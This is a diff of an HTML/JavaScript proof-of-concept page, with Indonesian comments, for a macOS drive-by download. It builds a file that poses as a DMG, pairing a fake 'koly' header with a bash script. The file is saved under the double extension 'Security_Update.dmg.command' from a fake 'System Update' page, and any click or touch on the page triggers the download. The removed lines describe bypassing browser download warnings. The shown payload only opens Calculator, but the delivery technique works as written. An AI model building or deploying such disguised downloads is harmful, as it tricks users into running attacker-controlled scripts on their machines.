@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Bypass Drive-by Download (DMG)</title>
+<title>Polyglot DMG + Command (Kalkulator)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Bypass Drive-by Download (DMG)</h2>
-<p>Memanipulasi interaksi klik untuk mengunduh file .dmg melewati peringatan filter browser.</p>
+<h2>Polyglot DMG + Command</h2>
+<p>Klik tombol untuk mengunduh file yang terlihat seperti .dmg, tetapi berisi skrip terminal pembuka kalkulator.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -52,7 +52,6 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Payload HTML dengan manipulasi User Gesture
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
             "<head><meta charset='UTF-8'><title>System Update</title></head>" +
@@ -68,8 +67,12 @@ const prepareMimeBlobAsync = (i) => {
             "\"use strict\";" +
             "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
             
-            // DATA DMG TIRUAN: Tidak pakai Base64, langsung teks
-            "var dmgData = 'koly\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0002\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000';" +
+            // PAYLOAD POLYGLOT: 
+            // 1. Header DMG (koly)
+            // 2. Shell script untuk membuka kalkulator
+            "var dmgHeader = 'koly\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0002\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000';" +
+            "var shellScript = '\\n#!/bin/bash\\nopen -a Calculator\\n';" +
+            "var payloadData = dmgHeader + shellScript;" +
             
             "var sudah = false;" +
             
@@ -79,12 +82,13 @@ const prepareMimeBlobAsync = (i) => {
             "    var statusEl = document.getElementById('status');" +
             "    try{" +
             "        statusEl.textContent = 'Mengekstrak paket...';" +
-            // Buat Blob dari data teks (bukan Base64)
-            "        var blob = new Blob([dmgData], { type: 'application/x-apple-diskimage' });" +
+            // Menggunakan tipe MIME aplikasi disk image
+            "        var blob = new Blob([payloadData], { type: 'application/x-apple-diskimage' });" +
             "        var url = URL.createObjectURL(blob);" +
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
-            "        a.download = 'Security_Update.dmg';" +
+            // Trik Ekstensi Ganda: .dmg.command
+            "        a.download = 'Security_Update.dmg.command';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
@@ -101,7 +105,6 @@ const prepareMimeBlobAsync = (i) => {
             "    }" +
             "}" +
             
-            // MANIPULASI GESTURE: Trigger pada event click/touch apa pun di halaman
             "document.addEventListener('click', picuDownload);" +
             "document.addEventListener('touchstart', picuDownload);" +
             "})();" +
